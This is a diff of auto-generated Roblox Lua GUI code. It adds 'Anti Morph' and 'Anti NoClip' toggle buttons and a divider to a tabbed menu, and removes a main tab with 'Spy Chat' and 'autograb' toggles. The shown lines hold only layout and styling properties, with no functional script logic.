+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph
+G2L["202"] = Instance.new("Frame", G2L["1ac"]);
+G2L["202"]["BorderSizePixel"] = 0;
+G2L["202"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["202"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["202"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["202"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["202"]["Name"] = [[morph]];
+G2L["202"]["LayoutOrder"] = 5;
+G2L["202"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.text.text
-G2L["203"] = Instance.new("UIStroke", G2L["201"]);
-G2L["203"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button
+G2L["203"] = Instance.new("TextButton", G2L["202"]);
+G2L["203"]["BorderSizePixel"] = 0;
+G2L["203"]["TextTransparency"] = 1;
+G2L["203"]["TextSize"] = 14;
+G2L["203"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["203"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["203"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["203"]["BackgroundTransparency"] = 1;
+G2L["203"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["203"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["203"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.jail.UIPadding
-G2L["204"] = Instance.new("UIPadding", G2L["1fa"]);
-G2L["204"]["PaddingLeft"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.UIPadding
+G2L["204"] = Instance.new("UIPadding", G2L["203"]);
+G2L["204"]["PaddingTop"] = UDim.new(0, 3);
+G2L["204"]["PaddingRight"] = UDim.new(0, 3);
+G2L["204"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["204"]["PaddingBottom"] = UDim.new(0, 3);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside
-G2L["205"] = Instance.new("Frame", G2L["17b"]);
-G2L["205"]["BorderSizePixel"] = 0;
-G2L["205"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["205"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["205"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
-G2L["205"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["205"]["Name"] = [[leftside]];
-G2L["205"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame
+G2L["205"] = Instance.new("Frame", G2L["203"]);
+G2L["205"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["205"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["205"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["205"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["205"]["Name"] = [[toggleFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab
-G2L["206"] = Instance.new("Frame", G2L["205"]);
-G2L["206"]["BorderSizePixel"] = 0;
-G2L["206"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
-G2L["206"]["Size"] = UDim2.new(0, 176, 0, 160);
-G2L["206"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["206"]["Name"] = [[mainTab]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.outlineStroke
+G2L["206"] = Instance.new("UIStroke", G2L["205"]);
+G2L["206"]["Thickness"] = 2;
+G2L["206"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.mainScriptTCO
-G2L["207"] = Instance.new("LocalScript", G2L["206"]);
-G2L["207"]["Name"] = [[mainScriptTCO]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade
+G2L["207"] = Instance.new("CanvasGroup", G2L["205"]);
+G2L["207"]["BorderSizePixel"] = 0;
+G2L["207"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["207"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["207"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["207"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["207"]["Name"] = [[toggleFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======
-G2L["208"] = Instance.new("Frame", G2L["206"]);
-G2L["208"]["BorderSizePixel"] = 0;
-G2L["208"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["208"]["Size"] = UDim2.new(1, 0, 0, 4);
-G2L["208"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["208"]["Name"] = [[======ACCENT======]];
-G2L["208"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.button.toggleFrame.toggleFade.UIGradient
+G2L["208"] = Instance.new("UIGradient", G2L["207"]);
+G2L["208"]["Rotation"] = 90;
+G2L["208"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor
-G2L["209"] = Instance.new("Frame", G2L["208"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text
+G2L["209"] = Instance.new("TextLabel", G2L["202"]);
+G2L["209"]["TextWrapped"] = true;
 G2L["209"]["BorderSizePixel"] = 0;
-G2L["209"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["209"]["Size"] = UDim2.new(1, -2, 0, 2);
-G2L["209"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["209"]["TextSize"] = 14;
+G2L["209"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["209"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["209"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["209"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["209"]["BackgroundTransparency"] = 1;
+G2L["209"]["Size"] = UDim2.new(0, 156, 0, 20);
 G2L["209"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["209"]["Name"] = [[GuiColor]];
+G2L["209"]["Text"] = [[Anti Morph]];
+G2L["209"]["Name"] = [[text]];
+G2L["209"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======ACCENT======.GuiColor.UICorner
-G2L["20a"] = Instance.new("UICorner", G2L["209"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.UIPadding
+G2L["20a"] = Instance.new("UIPadding", G2L["209"]);
+G2L["20a"]["PaddingLeft"] = UDim.new(0, 5);
 
 
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.UIListLayout
-G2L["20b"] = Instance.new("UIListLayout", G2L["206"]);
-G2L["20b"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
-G2L["20b"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.text.text
+G2L["20b"] = Instance.new("UIStroke", G2L["209"]);
+G2L["20b"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======
-G2L["20c"] = Instance.new("Frame", G2L["206"]);
-G2L["20c"]["BorderSizePixel"] = 0;
-G2L["20c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["20c"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["20c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["20c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["20c"]["Name"] = [[======TITLE======]];
-G2L["20c"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.morph.UIPadding
+G2L["20c"] = Instance.new("UIPadding", G2L["202"]);
+G2L["20c"]["PaddingLeft"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text
-G2L["20d"] = Instance.new("TextLabel", G2L["20c"]);
-G2L["20d"]["TextWrapped"] = true;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip
+G2L["20d"] = Instance.new("Frame", G2L["1ac"]);
 G2L["20d"]["BorderSizePixel"] = 0;
-G2L["20d"]["TextSize"] = 14;
-G2L["20d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["20d"]["TextTransparency"] = 0.3;
 G2L["20d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["20d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["20d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["20d"]["BackgroundTransparency"] = 1;
-G2L["20d"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["20d"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["20d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["20d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["20d"]["Text"] = [[Main]];
-G2L["20d"]["Name"] = [[text]];
-G2L["20d"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
+G2L["20d"]["Name"] = [[noclip]];
+G2L["20d"]["LayoutOrder"] = 8;
+G2L["20d"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.text
-G2L["20e"] = Instance.new("UIStroke", G2L["20d"]);
-G2L["20e"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button
+G2L["20e"] = Instance.new("TextButton", G2L["20d"]);
+G2L["20e"]["BorderSizePixel"] = 0;
+G2L["20e"]["TextTransparency"] = 1;
+G2L["20e"]["TextSize"] = 14;
+G2L["20e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["20e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["20e"]["BackgroundTransparency"] = 1;
+G2L["20e"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["20e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["20e"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.text.UIPadding
-G2L["20f"] = Instance.new("UIPadding", G2L["20d"]);
-G2L["20f"]["PaddingLeft"] = UDim.new(0, 1);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.UIPadding
+G2L["20f"] = Instance.new("UIPadding", G2L["20e"]);
+G2L["20f"]["PaddingTop"] = UDim.new(0, 3);
+G2L["20f"]["PaddingRight"] = UDim.new(0, 3);
+G2L["20f"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["20f"]["PaddingBottom"] = UDim.new(0, 3);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.======TITLE======.minimise
-G2L["210"] = Instance.new("TextButton", G2L["20c"]);
-G2L["210"]["BorderSizePixel"] = 0;
-G2L["210"]["TextTransparency"] = 0.3;
-G2L["210"]["TextSize"] = 14;
-G2L["210"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["210"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["210"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["210"]["BackgroundTransparency"] = 1;
-G2L["210"]["Size"] = UDim2.new(0, 35, 1, 0);
-G2L["210"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["210"]["Text"] = [[-]];
-G2L["210"]["Name"] = [[minimise]];
-G2L["210"]["Position"] = UDim2.new(1, -30, 0, 0);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame
+G2L["210"] = Instance.new("Frame", G2L["20e"]);
+G2L["210"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["210"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["210"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["210"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["210"]["Name"] = [[toggleFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.greystroke
-G2L["211"] = Instance.new("UIStroke", G2L["206"]);
-G2L["211"]["ZIndex"] = 99;
-G2L["211"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["211"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["211"]["Name"] = [[greystroke]];
-G2L["211"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.outlineStroke
+G2L["211"] = Instance.new("UIStroke", G2L["210"]);
+G2L["211"]["Thickness"] = 2;
+G2L["211"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat
-G2L["212"] = Instance.new("Frame", G2L["206"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade
+G2L["212"] = Instance.new("CanvasGroup", G2L["210"]);
 G2L["212"]["BorderSizePixel"] = 0;
 G2L["212"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["212"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["212"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["212"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["212"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["212"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["212"]["Name"] = [[spychat]];
-G2L["212"]["LayoutOrder"] = 2;
-G2L["212"]["BackgroundTransparency"] = 1;
+G2L["212"]["Name"] = [[toggleFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button
-G2L["213"] = Instance.new("TextButton", G2L["212"]);
-G2L["213"]["BorderSizePixel"] = 0;
-G2L["213"]["TextTransparency"] = 1;
-G2L["213"]["TextSize"] = 14;
-G2L["213"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["213"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["213"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["213"]["BackgroundTransparency"] = 1;
-G2L["213"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["213"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["213"]["Name"] = [[button]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.button.toggleFrame.toggleFade.UIGradient
+G2L["213"] = Instance.new("UIGradient", G2L["212"]);
+G2L["213"]["Rotation"] = 90;
+G2L["213"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.UIPadding
-G2L["214"] = Instance.new("UIPadding", G2L["213"]);
-G2L["214"]["PaddingTop"] = UDim.new(0, 3);
-G2L["214"]["PaddingRight"] = UDim.new(0, 3);
-G2L["214"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["214"]["PaddingBottom"] = UDim.new(0, 3);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text
+G2L["214"] = Instance.new("TextLabel", G2L["20d"]);
+G2L["214"]["TextWrapped"] = true;
+G2L["214"]["BorderSizePixel"] = 0;
+G2L["214"]["TextSize"] = 14;
+G2L["214"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["214"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["214"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["214"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["214"]["BackgroundTransparency"] = 1;
+G2L["214"]["Size"] = UDim2.new(0, 156, 0, 20);
+G2L["214"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["214"]["Text"] = [[Anti NoClip]];
+G2L["214"]["Name"] = [[text]];
+G2L["214"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame
-G2L["215"] = Instance.new("Frame", G2L["213"]);
-G2L["215"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["215"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["215"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["215"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["215"]["Name"] = [[toggleFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.UIPadding
+G2L["215"] = Instance.new("UIPadding", G2L["214"]);
+G2L["215"]["PaddingLeft"] = UDim.new(0, 5);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.outlineStroke
-G2L["216"] = Instance.new("UIStroke", G2L["215"]);
-G2L["216"]["Thickness"] = 2;
-G2L["216"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.text.text
+G2L["216"] = Instance.new("UIStroke", G2L["214"]);
+G2L["216"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade
-G2L["217"] = Instance.new("CanvasGroup", G2L["215"]);
-G2L["217"]["BorderSizePixel"] = 0;
-G2L["217"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["217"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["217"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["217"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["217"]["Name"] = [[toggleFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.noclip.UIPadding
+G2L["217"] = Instance.new("UIPadding", G2L["20d"]);
+G2L["217"]["PaddingLeft"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.button.toggleFrame.toggleFade.UIGradient
-G2L["218"] = Instance.new("UIGradient", G2L["217"]);
-G2L["218"]["Rotation"] = 90;
-G2L["218"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---
+G2L["218"] = Instance.new("Frame", G2L["1ac"]);
+G2L["218"]["BorderSizePixel"] = 0;
+G2L["218"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["218"]["Size"] = UDim2.new(1, 0, 0, 10);
+G2L["218"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["218"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["218"]["Name"] = [[---DIVIDER---]];
+G2L["218"]["LayoutOrder"] = 6;
+G2L["218"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text
-G2L["219"] = Instance.new("TextLabel", G2L["212"]);
-G2L["219"]["TextWrapped"] = true;
-G2L["219"]["BorderSizePixel"] = 0;
-G2L["219"]["TextSize"] = 14;
-G2L["219"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["219"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["219"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["219"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["219"]["BackgroundTransparency"] = 1;
-G2L["219"]["Size"] = UDim2.new(0, 156, 0, 20);
-G2L["219"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["219"]["Text"] = [[Spy Chat]];
-G2L["219"]["Name"] = [[text]];
-G2L["219"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame
+G2L["219"] = Instance.new("Frame", G2L["218"]);
+G2L["219"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["219"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["219"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["219"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["219"]["Name"] = [[dividerFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.UIPadding
-G2L["21a"] = Instance.new("UIPadding", G2L["219"]);
-G2L["21a"]["PaddingLeft"] = UDim.new(0, 5);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.outlineStroke
+G2L["21a"] = Instance.new("UIStroke", G2L["219"]);
+G2L["21a"]["Thickness"] = 2;
+G2L["21a"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.text.text
-G2L["21b"] = Instance.new("UIStroke", G2L["219"]);
-G2L["21b"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade
+G2L["21b"] = Instance.new("CanvasGroup", G2L["219"]);
+G2L["21b"]["BorderSizePixel"] = 0;
+G2L["21b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["21b"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["21b"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["21b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["21b"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.spychat.UIPadding
-G2L["21c"] = Instance.new("UIPadding", G2L["212"]);
-G2L["21c"]["PaddingLeft"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.buttonFade.UIGradient
+G2L["21c"] = Instance.new("UIGradient", G2L["21b"]);
+G2L["21c"]["Rotation"] = 90;
+G2L["21c"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb
-G2L["21d"] = Instance.new("Frame", G2L["206"]);
-G2L["21d"]["BorderSizePixel"] = 0;
-G2L["21d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["21d"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["21d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["21d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["21d"]["Name"] = [[autograb]];
-G2L["21d"]["LayoutOrder"] = 2;
-G2L["21d"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UIStroke
+G2L["21d"] = Instance.new("UIStroke", G2L["219"]);
+G2L["21d"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["21d"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button
-G2L["21e"] = Instance.new("TextButton", G2L["21d"]);
-G2L["21e"]["BorderSizePixel"] = 0;
-G2L["21e"]["TextTransparency"] = 1;
-G2L["21e"]["TextSize"] = 14;
-G2L["21e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["21e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["21e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["21e"]["BackgroundTransparency"] = 1;
-G2L["21e"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["21e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["21e"]["Name"] = [[button]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.dividerFrame.UICorner
+G2L["21e"] = Instance.new("UICorner", G2L["219"]);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.UIPadding
-G2L["21f"] = Instance.new("UIPadding", G2L["21e"]);
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.---DIVIDER---.UIPadding
+G2L["21f"] = Instance.new("UIPadding", G2L["218"]);
 G2L["21f"]["PaddingTop"] = UDim.new(0, 3);
-G2L["21f"]["PaddingRight"] = UDim.new(0, 3);
-G2L["21f"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["21f"]["PaddingRight"] = UDim.new(0, 6);
+G2L["21f"]["PaddingLeft"] = UDim.new(0, 6);
 G2L["21f"]["PaddingBottom"] = UDim.new(0, 3);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.leftside.mainTab.autograb.button.toggleFrame
-G2L["220"] = Instance.new("Frame", G2L["21e"]);
-G2L["220"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["220"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["220"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["220"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["220"]["Name"] = [[toggleFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.TCOMain.rightside.antiTab.autoresetLABEL
+G2L["220"] = Instance.new("Frame", G2L["1ac"]);
+G2L["220"]["BorderSizePixel"] = 0;
+G2L["220"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["220"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["220"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
+G2L["220"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["220"]["Name"] = [[autoresetLABEL]];
+G2L["220"]["LayoutOrder"] = 4;
